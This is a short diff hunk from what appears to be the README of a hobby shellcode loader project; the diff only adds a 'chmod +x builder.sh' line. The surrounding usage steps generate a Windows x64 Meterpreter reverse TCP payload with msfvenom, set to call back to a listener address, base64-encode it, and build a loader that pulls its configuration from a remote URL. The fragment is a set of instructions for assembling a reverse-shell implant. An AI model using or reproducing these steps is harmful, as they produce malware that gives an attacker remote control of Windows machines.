@@ -11,6 +11,7 @@ A tiny shellcode loader I am having fun with. It reads a JSON file from a base64
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LISTENER_IP> LPORT=<LISTENER_PORT> -f raw -o WHATEVER.bin
 base64 WHATEVER.bin > WHATEVERb64.bin
+chmod +x builder.sh
 ./builder.sh <http://IP/config> main.go
 ```
 At this point the loader as well as a basic payload should be ready. Modify the main.go and instr file to suit your situation.
